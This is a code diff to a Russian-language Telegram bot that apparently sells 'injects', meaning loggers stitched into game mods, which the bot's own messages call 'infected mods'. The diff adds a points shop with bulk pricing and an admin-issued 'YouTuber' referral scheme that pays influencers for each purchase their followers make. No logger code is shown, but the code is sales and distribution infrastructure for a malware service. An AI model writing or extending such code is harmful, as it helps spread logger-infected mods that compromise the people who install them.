@@ -99,6 +99,10 @@ def create_user(user_id, username=""):
         "has_invited": False,
         "blocked": False,
         "created": int(time.time()),
+        "points": 0,
+        "youtuber": False,
+        "youtuber_code": None,
+        "referred_by_youtuber": None,
     }
     users[str(user_id)] = user
     save_users(users)
@@ -123,6 +127,10 @@ def main_menu() -> InlineKeyboardMarkup:
             [
                 InlineKeyboardButton(text="Бесплатный инжект", callback_data="free"),
                 InlineKeyboardButton(text="🛒 Купить инжекты", callback_data="buy"),
+            ],
+            [
+                InlineKeyboardButton(text="🎁 Магазин за баллы", callback_data="points_shop"),
+                InlineKeyboardButton(text="💰 Мои баллы", callback_data="my_points"),
             ],
             [
                 InlineKeyboardButton(text="⭐ Оценить бота", callback_data="review"),
@@ -206,6 +214,27 @@ async def start_deep(message: Message):
             except Exception:
                 pass
             return
+        yt_user = None
+        yt_uid = None
+        for uid, u in users.items():
+            if u.get("youtuber") and u.get("youtuber_code") == ref_code:
+                yt_user = u
+                yt_uid = uid
+                break
+        if yt_user:
+            user["referred_by_youtuber"] = yt_uid
+            save_users(users)
+            try:
+                await bot.send_message(
+                    int(yt_uid),
+                    f"🎬 <b>Новый реферал!</b>\n\n"
+                    f"👤 <code>{user_id}</code> (@{username})"
+                )
+            except Exception:
+                pass
+            if is_new:
+                await send_welcome(message)
+            return
         for uid, u in users.items():
             if u.get("invite_code") == ref_code and str(uid) != str(user_id):
                 inviter = u
@@ -213,7 +242,6 @@ async def start_deep(message: Message):
         if inviter is not None and not inviter.get("has_invited"):
             inviter_uid = next((k for k, v in users.items() if v is inviter), None)
             user["invited_by"] = inviter_uid
-            user["injects"] = user.get("injects", 0) + 1
             inviter["has_invited"] = True
             inviter["injects"] = inviter.get("injects", 0) + 1
             save_users(users)
@@ -222,22 +250,13 @@ async def start_deep(message: Message):
                     int(inviter_uid),
                     f"🎉 <b>У тебя новый реферал!</b>\n\n"
                     f"👤 Приглашённый: {username}\n"
-                    f"💳 Тебе начислен <b>1 инжект</b> (бесплатный инжект)\n\n"
-                    f"Твой баланс: <b>{inviter.get('injects', 0)}</b>\n\n"
-                    f"Нажми «Вшить логгер в мод» и используй его!",
+                    f"💳 Тебе начислен <b>1 инжект</b>\n\n"
+                    f"Твой баланс: <b>{inviter.get('injects', 0)}</b>",
                 )
             except Exception:
                 pass
             if is_new:
                 await send_welcome(message)
-            await message.answer(
-                "🎉 <b>Поздравляем! Ты пришёл по реферальной ссылке!</b>\n\n"
-                "✅ Тебе начислен <b>1 бесплатный инжект</b>\n\n"
-                "Теперь ты можешь:\n"
-                "• Нажать «Вшить логгер в мод» и получить свой первый заражённый мод\n"
-                "• Пригласить своего друга и получить ещё один инжект\n\n"
-                "Если что-то непонятно — нажми «Поддержка» в меню."
-            )
             return
 
     if is_new:
@@ -981,7 +1000,24 @@ async def admin_confirm_payment(callback: CallbackQuery):
     if user is None:
         user = create_user(target, target)
     user["injects"] = user.get("injects", 0) + count
+    earned = count * 10
+    user["points"] = user.get("points", 0) + earned
     save_users(users)
+    referrer_id = user.get("referred_by_youtuber")
+    if referrer_id:
+        referrer = get_user(referrer_id)
+        if referrer:
+            referrer["points"] = referrer.get("points", 0) + earned
+            save_users(users)
+            try:
+                await bot.send_message(
+                    int(referrer_id),
+                    f"💰 <b>+{earned} баллов!</b>\n\n"
+                    f"Твой реферал <code>{target}</code> купил <b>{count}</b> инжект(ов).\n"
+                    f"Твой баланс: <b>{referrer['points']}</b>💰"
+                )
+            except Exception:
+                pass
     await callback.answer("✅ Инжекты начислены", show_alert=True)
     await callback.message.edit_reply_markup(
         reply_markup=InlineKeyboardMarkup(
@@ -992,8 +1028,8 @@ async def admin_confirm_payment(callback: CallbackQuery):
         await bot.send_message(
             int(target),
             f"🎁 <b>Оплата подтверждена!</b>\n\n"
-            f"Тебе начислено <b>{count}</b> инжект(ов).\n"
-            f"Твой баланс: <b>{user['injects']}</b>\n\n"
+            f"Тебе начислено <b>{count}</b> инжект(ов) и <b>{earned}💰 баллов</b>.\n"
+            f"Твой баланс: <b>{user['injects']}</b> инжектов, <b>{user['points']}</b>💰\n\n"
             f"Нажми «Вшить логгер в мод» и получи свой мод.",
         )
     except Exception:
@@ -1154,6 +1190,46 @@ async def admin_links_list(message: Message):
     await message.answer(
         f"📋 <b>Трекинг-ссылки ({len(admin_links)}):</b>\n\n" + "\n\n".join(lines)
     )
+
+
+@router.message(Command("setyoutuber"))
+async def admin_setyoutuber(message: Message):
+    if message.from_user.id not in ADMIN_IDS:
+        return
+    parts = message.text.split()
+    if len(parts) < 2:
+        await message.answer("❌ Формат: <code>/setyoutuber &lt;user_id&gt;</code>")
+        return
+    target = parts[1]
+    user = get_user(target)
+    if user is None:
+        await message.answer(f"❌ Пользователь <code>{target}</code> не найден.")
+        return
+    if user.get("youtuber"):
+        await message.answer(f"❌ Пользователь <code>{target}</code> уже ютубер.")
+        return
+    yt_code = "".join(random.choices(string.ascii_letters + string.digits, k=12))
+    user["youtuber"] = True
+    user["youtuber_code"] = yt_code
+    save_users(users)
+    await message.answer(
+        f"🎬 <b>Ютубер добавлен!</b>\n\n"
+        f"👤 Пользователь: <code>{target}</code> (@{user.get('username', '?')})\n"
+        f"🔗 Его ссылка:\n<code>https://t.me/{BOT_USERNAME}?start={yt_code}</code>\n\n"
+        f"📌 Его рефералы будут получать баллы за покупки.\n"
+        f"Он тоже будет получать баллы."
+    )
+    try:
+        await bot.send_message(
+            int(target),
+            f"🎬 <b>Ты стал ютубером!</b>\n\n"
+            f"Твоя персональная ссылка:\n"
+            f"<code>https://t.me/{BOT_USERNAME}?start={yt_code}</code>\n\n"
+            f"📌 Отправляй её подписчикам.\n"
+            f"За каждую покупку твоих рефералов ты получаешь <b>10 баллов</b>."
+        )
+    except Exception:
+        pass
 
 
 @router.message(Command("give"))
@@ -1520,6 +1596,99 @@ async def reviews_list(callback: CallbackQuery):
         )
     else:
         await callback.message.answer("📝 Канал с отзывами пока не настроен.")
+
+
+@router.callback_query(F.data == "my_points")
+async def my_points(callback: CallbackQuery):
+    await callback.answer()
+    user_id = callback.from_user.id
+    user = get_user(user_id)
+    if user is None:
+        user = create_user(user_id, callback.from_user.username or "")
+    points = user.get("points", 0)
+    yt_status = "🎬 Ютубер" if user.get("youtuber") else "—"
+    yt_code = user.get("youtuber_code", "")
+    referrer = user.get("referred_by_youtuber")
+    ref_info = f"👤 @{get_user(referrer).get('username', '?')}" if referrer and get_user(referrer) else "—"
+    text = (
+        f"💰 <b>Твои баллы:</b> <b>{points}</b>\n\n"
+        f"🎬 <b>Статус:</b> {yt_status}\n"
+    )
+    if yt_code:
+        text += f"🔗 <b>Твоя ссылка:</b>\n<code>https://t.me/{BOT_USERNAME}?start={yt_code}</code>\n\n"
+    text += (
+        f"🔗 <b>Приглашён через:</b> {ref_info}\n\n"
+        f"🎁 Трати баллы в «Магазин за баллы»"
+    )
+    await callback.message.answer(text, reply_markup=main_menu())
+
+
+@router.callback_query(F.data == "points_shop")
+async def points_shop(callback: CallbackQuery):
+    await callback.answer()
+    user_id = callback.from_user.id
+    user = get_user(user_id)
+    if user is None:
+        user = create_user(user_id, callback.from_user.username or "")
+    points = user.get("points", 0)
+    await callback.message.answer(
+        f"🎁 <b>Магазин за баллы</b>\n\n"
+        f"💰 Твой баланс: <b>{points}</b> баллов\n\n"
+        f"Выбери количество инжектов:\n"
+        f"💰 Баллы начисляются за покупки инжектов\n"
+        f"(ты и пригласивший — по 10 баллов за покупку)\n\n"
+        f"📌 Чем больше покупаешь — тем дешевле за штуку!",
+        reply_markup=InlineKeyboardMarkup(
+            inline_keyboard=[
+                [
+                    InlineKeyboardButton(text="1 инжект — 50💰", callback_data="buy_points:1"),
+                ],
+                [
+                    InlineKeyboardButton(text="5 инжектов — 200💰 (40/шт)", callback_data="buy_points:5"),
+                ],
+                [
+                    InlineKeyboardButton(text="10 инжектов — 350💰 (35/шт)", callback_data="buy_points:10"),
+                ],
+                [
+                    InlineKeyboardButton(text="25 инжектов — 750💰 (30/шт)", callback_data="buy_points:25"),
+                ],
+                [InlineKeyboardButton(text="◀️ Назад", callback_data="menu")],
+            ]
+        ),
+    )
+
+
+@router.callback_query(F.data.startswith("buy_points:"))
+async def buy_points_confirm(callback: CallbackQuery):
+    await callback.answer()
+    count = int(callback.data.split(":")[1])
+    prices = {1: 50, 5: 200, 10: 350, 25: 750}
+    price = prices[count]
+    user_id = callback.from_user.id
+    user = get_user(user_id)
+    if user is None:
+        user = create_user(user_id, callback.from_user.username or "")
+    current_points = user.get("points", 0)
+    if current_points < price:
+        await callback.message.answer(
+            f"❌ <b>Недостаточно баллов.</b>\n\n"
+            f"Нужно: <b>{price}</b>💰\n"
+            f"У тебя: <b>{current_points}</b>💰\n\n"
+            f"Нужно ещё <b>{price - current_points}</b> баллов.\n"
+            f"Покупай инжекты и получай баллы!",
+            reply_markup=main_menu()
+        )
+        return
+    user["points"] = current_points - price
+    user["injects"] = user.get("injects", 0) + count
+    save_users(users)
+    await callback.message.answer(
+        f"✅ <b>Куплено!</b>\n\n"
+        f"💳 Начислено: <b>{count}</b> инжект(ов)\n"
+        f"💰 Осталось баллов: <b>{user['points']}</b>\n"
+        f"🎁 Всего инжектов: <b>{user['injects']}</b>",
+        reply_markup=main_menu()
+    )
 
 
 async def main():
